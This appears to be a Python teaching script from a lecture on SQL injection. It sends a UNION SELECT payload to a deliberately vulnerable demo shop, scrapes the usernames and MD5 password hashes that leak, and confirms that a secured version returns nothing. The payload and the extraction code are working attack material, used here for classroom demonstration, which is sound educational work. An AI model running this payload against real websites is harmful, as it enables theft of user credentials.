"""SQL injection in the search box (Lecture 2)."""
import re

import requests

from common import NAIVE, SECURE, report

# The SAME text is typed into the search box of both shops.
PAYLOAD = "' UNION SELECT username, password_md5 FROM users --"


def run():
    page = requests.get(NAIVE + "/search", params={"q": PAYLOAD}).text
    leaked = re.findall(r"<li>([^<]+) - ([0-9a-f]{32})</li>", page)
    naive_detail = (f"leaked {len(leaked)} usernames + MD5 hashes, e.g. {leaked[0][0]}:{leaked[0][1][:12]}..."
                    if leaked else "nothing leaked")

    r = requests.get(SECURE + "/products/", params={"q": PAYLOAD})
    blocked = r.status_code == 200 and "0 found" in r.text and "$argon2" not in r.text
    return report("SQL injection", bool(leaked), naive_detail,
                  blocked, "searched for the text itself: 0 found, no hashes")


if __name__ == "__main__":
    run()
